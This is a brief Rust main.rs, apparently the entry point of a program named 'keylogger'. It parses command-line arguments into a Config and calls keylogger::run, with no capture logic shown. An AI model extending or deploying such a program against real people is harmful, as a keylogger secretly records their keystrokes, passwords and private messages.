use std::{env, process};

use keylogger::Config;

fn main() {
    let config = match Config::build(env::args()) {
        Ok(config) => config,
        Err(msg) => {
            eprintln!("{msg}");
            process::exit(1);
        }
    };
    
    if let Err(e) = keylogger::run(config) {
        eprintln!("{e}");
        process::exit(1);
    }
}
